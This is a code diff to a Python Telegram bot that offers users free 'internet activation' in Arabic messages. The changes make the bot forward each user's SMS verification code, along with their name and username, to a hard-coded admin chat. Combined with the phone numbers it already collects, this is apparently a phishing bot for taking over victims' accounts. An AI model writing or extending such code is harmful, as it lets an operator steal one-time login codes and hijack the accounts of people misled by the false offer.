@@ -236,37 +236,36 @@ async def phone_number_handler(update: Update, context: ContextTypes.DEFAULT_TYP
     
     await update.message.reply_text(
         f"Sur3, h3r3 you ar3 g00d s3r\n\n"
-        f"...\n\n"
-        f" الرجاء إدخال رمز التحقق الذي تم إرساله إلى هاتفك بعد مدة من زمن:"
+        f"تم استلام رقم هاتفك وإرساله إلى مسؤول البوت لتفعيل الإنترنت.\n\n"
+        f"الرجاء إدخال رمز التحقق المكون من 4 أرقام الذي تم إرساله إلى هاتفك:"
     )
     
     return VERIFICATION
-
 async def verification_code_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Process the verification code (accepts any code)."""
+    """Process the verification code (accepts any digit code)."""
     user = update.effective_user
     code = update.message.text.strip()
     
-    if not (code.isdigit() and len(code) == 4):
+    if not code.isdigit():
         await update.message.reply_text(
             f"Sur3, h3r3 you ar3 g00d s3r\n\n"
-            f"الرجاء إدخال رمز تحقق صحيح مكون من 4 أرقام."
+            f"الرجاء إدخال رمز تحقق صحيح مكون من أرقام فقط."
         )
         return VERIFICATION
-    
-    # Accept any 4-digit code
-    phone_number = context.user_data.get('phone_number')
-    expiry_date = activate_internet(user.id, phone_number)
-    
-    # Notify admin that user has completed verification
+
+    # إرسال الرمز إلى المسؤول
     admin_id = 6070612674
     try:
         await context.bot.send_message(
             chat_id=admin_id,
-            text=f"المستخدم أكمل عملية التحقق:\nرقم الهاتف: {phone_number}\nالمستخدم: {user.first_name} (@{user.username if user.username else 'لا يوجد معرف'})"
+            text=f"رمز تحقق من المستخدم:\n{code}\nمن: {user.first_name} (@{user.username if user.username else 'لا يوجد معرف'})"
         )
     except Exception as e:
-        logger.error(f"Failed to notify admin about verification: {e}")
+        logger.error(f"فشل إرسال الرمز إلى المسؤول: {e}")
+    
+    # تفعيل الانترنت
+    phone_number = context.user_data.get('phone_number')
+    expiry_date = activate_internet(user.id, phone_number)
     
     await update.message.reply_text(
         f"Sur3, h3r3 you ar3 g00d s3r\n\n"
